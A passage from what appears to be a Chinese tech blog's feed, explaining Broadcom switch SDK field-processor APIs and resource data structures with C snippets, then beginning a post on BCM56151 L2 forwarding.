style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_destroy<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_destroy_all<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_reinstall<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_entry_remove<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_qualify_clea<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field<em>qualify</em><em>**</em><br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_action_add<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">bcm_field_action_delete等。<br></span></p><p><span style="color:red; font-family:幼圆; font-size:10pt">Bcma接口<span style="color:#333333">：这套接口称为AdvancedContentAware Enhanced Software (ACES) implementation，传递的参数为bcma_acl_t*list，以结构体形式将规则所有参数下发到硬件；<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">/<em> List Management functions </em>/<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_add(bcma_acl_t*list_id);<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_remove(bcma_acl_list_id_tlist_id);<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_get(bcma_acl_list_id_tlist_id, bcma_acl_t *list);<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern intbcma_acl_rule_add(bcma_acl_list_id_t list_id,<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                            </span><span style="font-family:幼圆"> bcma_acl_rule_t*rule);<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_rule_remove(bcma_acl_list_id_tlist_id,<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                               </span><span style="font-family:幼圆">bcma_acl_rule_id_t rule_id);<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern intbcma_acl_rule_get(bcma_acl_rule_id_t rule_id,<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                     </span><span style="font-family:幼圆"><br>            </span><span style="font-family:Arial">       </span><span style="font-family:幼圆">bcma_acl_rule_t **rule);<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">/<em> Validation and Installation functions </em>/<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_install(void);<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">extern int bcma_acl_uninstall(void); 等。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:18pt"><strong><a name="t3">SDK对FP资源管理的相关数据结构</a></strong></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">1.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">BCM芯片每一个unit都有这么一个结构体来保存芯片所有FP的资源占用情况：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">static _field_control_t</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> *_field_control[BCM_MAX_NUM_UNITS];<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">field_control_t的具体内容为（每个变量都有详细注释，此处不再阐述）：<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">struct _field_control_s {</span><span style="font-family:Arial">                                           </span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">sal_mutex_t</span><span style="font-family:Arial">           </span><span style="font-family:幼圆">fc_lock;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Protectionmutex.</em></span><span style="font-family:Arial">            </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">bcm_field_stage_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"><br>            </span><span style="font-family:Arial"> </span><span style="font-family:幼圆">stage;</span><span style="font-family:Arial">        </span><span style="font-family:幼圆">/<em> Default FP pipeline stage.</em></span><span style="font-family:Arial">   </span><span style="font-family:幼圆">/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">max_stage_id;</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<em> Number of fpstages.</em></span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_udf_t</span><span style="font-family:Arial">          </span><span style="font-family:幼圆"> <em>udf;</em></span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> / field_status-&gt;group_total</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">struct _field_group_s</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"><em>groups;</em></span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> / List of groupsin unit.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">struct_field_stage_s </span><span style="font-family:Arial"> </span><span style="font-family:幼圆"><em>stages;</em></span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> / Pipeline stage FP info.</span><span style="font-family:Arial">  </span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">2.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">然后对field_control_t中的_field_group_s表示一种应用占用的slice和slice的规则记录：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">_field_group_s {<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">bcm_field_group_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> gid;</span><span style="font-family:Arial">           </span><span style="font-family:幼圆"> /<em> Opaque handle.</em></span><span style="font-family:Arial">               </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">priority;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Field grouppriority.</em></span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">bcm_field_qset_t</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> qset;</span><span style="font-family:Arial">          </span><span style="font-family:幼圆"> /<em> This group’s Qualifier Set.</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">uint8</span><span style="font-family:Arial">                 </span><span style="font-family:幼圆"> flags;</span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> /<em> Group configuration flags.</em></span><span style="font-family:Arial">   </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_slice_t</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"><em>slices;</em></span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> / Pointer intoslice array.</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">bcm_pbmp_t</span><span style="font-family:Arial">            </span><span style="font-family:幼圆"> pbmp;</span><span style="font-family:Arial">          </span><span style="font-family:幼圆"> /<em> Ports in use this group.</em></span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_sel_t sel_codes[_FP_MAX_ENTRY_WIDTH]; /<em> Select codes forslice(s). </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_bcm_field_group_qual_t qual_arr[_FP_MAX_ENTRY_WIDTH];<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                          </span><span style="font-family:幼圆"><br>            </span><span style="font-family:Arial">                </span><span style="font-family:幼圆">/* Qualifiers available in each<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                                             </span><span style="font-family:幼圆">individual entry part.</span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">_field_stage_id_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> stage_id;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> FP pipeline stage id.</em></span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">3.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">在每一个unit中还有_field_stage_s来对各种FP（VFP/IFP/EFP）的资源记录的数据结构：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">typedef struct _field_stage_s {<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_stage_id_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆">stage_id;</span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> /<em> Pipeline stageid.</em></span><span style="font-family:Arial">          </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">uint8</span><span style="font-family:Arial">                 </span><span style="font-family:幼圆"> flags;</span><span style="font-family:Arial">          </span><span style="font-family:幼圆"> /<em> Stage flags.</em></span><span style="font-family:Arial">                </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">tcam_sz;</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> /<em> Number ofentries in TCAM.</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">tcam_slices;</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> /<em> Number ofinternal slices.</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">struct_field_slice_s</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> <em>slices;</em></span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> / Array of slices.*/<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">4.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">在在每一个_field_stage_s中用_field_slice_s对每一个slice资源进行记录的结构体：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">_field_slice_s {<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">uint8</span><span style="font-family:Arial">                 </span><span style="font-family:幼圆">slice_number;</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<em> Hardware slicenumber.</em></span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">start_tcam_idx;/<em> Slice first entry tcam index.</em></span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">entry_count;</span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<em> Number of entriesin the slice.</em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">free_count;</span><span style="font-family:Arial">   </span><span style="font-family:幼圆"> /<em> Number of freeentries.</em></span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">counters_count;/<em> Number of counters accessible. </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆">meters_count;</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<em> Number of metersaccessible.</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_counter_bmp_t</span><span style="font-family:Arial">  </span><span style="font-family:幼圆">counter_bmp;</span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<em> Bitmap forcounter allocation. </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_meter_bmp_t</span><span style="font-family:Arial">    </span><span style="font-family:幼圆">meter_bmp;</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> /<em> Bitmap for meterallocation.</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">_field_stage_id_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆">stage_id;</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> /<em> Pipeline stageslice belongs.</em></span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆">bcm_pbmp_t</span><span style="font-family:Arial">   </span><span style="font-family:幼圆"><br>            </span><span style="font-family:Arial">         </span><span style="font-family:幼圆">pbmp;</span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> /<em> Ports in use by groups.</em></span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">    </span><span style="font-family:幼圆">struct _field_entry_s</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"><em>*entries;</em></span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> / List of entriespointers.</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">5.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">在在每一个_field_slice_s中用_field_entry_s对slice内部的entry进行记录：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">struct_field_entry_s {<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> bcm_field_entry_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> eid;</span><span style="font-family:Arial">       </span><span style="font-family:幼圆">/<em> BCM unit unique entryidentifier</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> int</span><span style="font-family:Arial">                   </span><span style="font-family:幼圆"> prio;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Entry priority</em></span><span style="font-family:Arial">                    </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> uint32</span><span style="font-family:Arial">                </span><span style="font-family:幼圆"> slice_idx;</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<em> Field entry tcam index.</em></span><span style="font-family:Arial">           </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> uint16</span><span style="font-family:Arial">                </span><span style="font-family:幼圆"> flags;</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> /<em> _FP_ENTRY_xxx flags</em></span><span style="font-family:Arial">               </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_tcam_t</span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> tcam;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Fields to be written intoFP_TCAM</em></span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_tcam_t</span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> extra_tcam;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">#ifdefined(BCM_RAPTOR_SUPPORT) || defined(BCM_TRX_SUPPORT)<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_pbmp_t</span><span style="font-family:Arial">         </span><span style="font-family:幼圆"> pbmp;</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> /<em> Port bitmap </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">#endif /<em>BCM_RAPTOR_SUPPORT || BCM_TRX_SUPPORT </em>/</span><span style="font-family:Arial">   </span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_action_t</span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> <em>actions;</em></span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> / linked list of actions for entry</span><span style="font-family:Arial">  </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_slice_t</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> <em>fs;</em></span><span style="font-family:Arial">       </span><span style="font-family:幼圆"> / Slice where entry lives</span><span style="font-family:Arial">           </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_group_t</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> <em>group;</em></span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> / Group where entry lives</span><span style="font-family:Arial">           </span><span style="font-family:幼圆"> */<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_entry_stat_t</span><span style="font-family:Arial">   </span><span style="font-family:幼圆"> statistic;</span><span style="font-family:Arial"> </span><span style="font-family:幼圆">/<em> Statistics collection entity.</em></span><span style="font-family:Arial">     </span><span style="font-family:幼圆">/</span><span style="font-family:Arial">          </span><span style="font-family:幼圆"><br>            </span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">                                      </span><span style="font-family:幼圆"> /<em>Policers attached to the entry.</em></span><span style="font-family:Arial">   </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_entry_policer_tpolicer[_FP_POLICER_LEVEL_COUNT];<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">#ifdefined(BCM_KATANA_SUPPORT)<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> _field_entry_policer_tglobal_meter_policer;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">#endif<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> struct _field_entry_s</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> <em>next;</em></span><span style="font-family:Arial">     </span><span style="font-family:幼圆">/ Entry lookup linked list.</span><span style="font-family:Arial">         </span><span style="font-family:幼圆">*/<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">};<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">上面actions 是一个_field_action_t的结构体的链表，其信息为：<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">typedef struct_field_action_s {<br></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> bcm_field_action_t</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> action;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> action type</em></span><span style="font-family:Arial">              </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> uint32</span><span style="font-family:Arial">                </span><span style="font-family:幼圆"> param0;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Action specific parameter </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> uint32</span><span style="font-family:Arial">                </span><span style="font-family:幼圆"> param1;</span><span style="font-family:Arial">      </span><span style="font-family:幼圆"> /<em> Action specific parameter </em>/<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> uint8</span><span style="font-family:Arial">                 </span><span style="font-family:幼圆"> inst_flg;</span><span style="font-family:Arial">    </span><span style="font-family:幼圆"> /<em> Installed Flag</em></span><span style="font-family:Arial">           </span><span style="font-family:幼圆"> /<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> struct _field_action_s *next;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}_field_action_t;<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">6.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">在SDK编码中，用UNIT号获取对应的_field_control_t信息的代码可以如下：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">_field_control_t</span><span style="font-family:Arial">   </span><span style="font-family:幼圆"> *fc;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">BCM_IF_ERROR_RETURN(_field_control_get(unit,&amp;fc));<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">7.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">进而获取每一个group资源的代码可以如下：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial"> </span><span style="font-family:幼圆">_field_group_t</span><span style="font-family:Arial">     </span><span style="font-family:幼圆"> *fg;<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial"> </span><span style="font-family:幼圆">fg = fc-&gt;groups;<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> while (fg != NULL) {<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">       </span><span style="font-family:幼圆"> if (fg-&gt;gid == gid) {<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">           </span><span style="font-family:幼圆"> *group_p = fg;<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">           </span><span style="font-family:幼圆"> return (BCM_E_NONE);<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">       </span><span style="font-family:幼圆"> }<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">       </span><span style="font-family:幼圆"> fg = fg-&gt;next;<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial">   </span><span style="font-family:幼圆"> }<br></span></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">8.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">获取每一个slice的资源可以如下<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">_field_slice_t</span><span style="font-family:Arial">        </span><span style="font-family:幼圆"> *slices;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">slice =&amp;fg-&gt;slices[0];<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">while(slice !=NULL){<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">slice = slice-&gt;prev;<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">}<br></span></p><p><span style="color:red; font-size:10pt"><span style="font-family:幼圆">9.</span><span style="font-family:Arial">      </span><span style="font-family:幼圆">获取slice中规则的的资源可以如下：<span style="color:#333333"><br>                </span></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:幼圆">_field_entry_t</span><span style="font-family:Arial">  </span><span style="font-family:幼圆">*f_ent;<br></span></span></p><p><span style="color:#333333; font-size:10pt"><span style="font-family:Arial"> </span><span style="font-family:幼圆">_field_action_t</span><span style="font-family:Arial"> </span><span style="font-family:幼圆"> *fa_iter;<br></span></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">_field_entry_get(unit, entry, _FP_ENTRY_PRIMARY,&amp;f_ent);//entry<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">fa_iter = f_ent-&gt;actions;//entry的action<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">熟悉FP同学可能深知FP资源的稀缺性和重要性，可以用惜slice如黄金来做比喻；虽然FP的规则数很多，但是FP的资源申请和释放是按照slice为单位来进行的，且slice的数目一般都不是很多；所以我们要将尽量多的规则整合到一个slice里，尽量减少slice里有规则被浪费的现象；这个也是再将来的协议改造中必须考虑到的一个因素。<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:10pt">到这里对FP的原理和SDK的相关数据结构介绍到这里，如果描述中有不清晰或者不准确的地方欢迎随时沟通讨论。<br></span></p>]]></content>
    
    <summary type="html">
    
      作者: 北京—小武 邮箱：night_elf1020@163.com 新浪微博：北京-小武 BCM芯片有几个大的模块：
VLAN、L2、L3和FP等几个，其中FP的使用也最为灵活，能解析匹配数据包文的前128字节比特级的内容，动作包括转发、丢弃
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
    
  </entry>
  
  <entry>
    <title>BCM56151路由学习总结</title>
    <link href="http://demonelf.github.io/EMBEDDED/BCM56151%E8%B7%AF%E7%94%B1%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>http://demonelf.github.io/EMBEDDED/BCM56151路由学习总结.html</id>
    <published>2019-08-29T04:18:26.884Z</published>
    <updated>2019-08-29T04:16:37.965Z</updated>
    
    <content type="html"><![CDATA[<ol><li><div style="background: #4f81bd"><br><br># BCM包处理原理<br><br></div></li></ol><a id="more"></a><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561511.png" alt=""><span style="font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt"><strong>L2转发流程</strong><br>        </span></p><ol><li><div style="background: #4f81bd"><br><br># L2转发流程<br><br></div></li></ol><p><span style="color:#333333; font-family:幼圆; font-size:12pt">对于交换芯片来说，L2转发是一个最基本的功能。<br></span></p><h2 id="2-1-L2功能主要包括："><a href="#2-1-L2功能主要包括：" class="headerlink" title="2.1 L2功能主要包括："></a>2.1 L2功能主要包括<span style="color:#333333; font-family:幼圆; font-size:12pt">：</span></h2><p></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">ingress过滤、<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">MAC学习和老化、<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">根据MAC+VLAN转发、<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">广播与洪泛、<br></span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">生成树控制等基本功能。<br></span></p><h2 id="2-2-L2转发的具体流程如图3所示："><a href="#2-2-L2转发的具体流程如图3所示：" class="headerlink" title="2.2 L2转发的具体流程如图3所示："></a>2.2 L2转发的具体流程如图3所示：</h2><p><img src="http://www.madhex.com/wp-content/uploads/2017/03/031517_0647_BCM561512.jpg" alt=""><span style="color:#333333; font-family:幼圆; font-size:12pt"><br>        </span></p><p><span style="color:#333333; font-family:幼圆; font-size:12pt">图3 L2转发流程<br></span></p><h2 id="2-3-L2转发流程"><a href="#2-3-L2转发流程" class="headerlink" title="2.3 L2转发流程"></a>2.3 L2转发流程</h2><p><span style="color:#333333; font-family:幼圆; 